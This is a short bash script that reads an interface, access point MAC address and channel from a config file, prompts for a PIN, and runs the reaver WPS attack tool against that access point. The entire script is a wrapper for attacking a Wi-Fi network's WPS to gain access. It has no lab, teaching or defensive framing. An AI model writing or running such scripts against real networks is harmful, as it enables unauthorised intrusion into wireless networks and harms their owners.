#!/bin/bash

source config.txt

read -p "Enter PIN: " pin

reaver -i $interface -b $ap_mac -c $channel -p $pin -N -vv
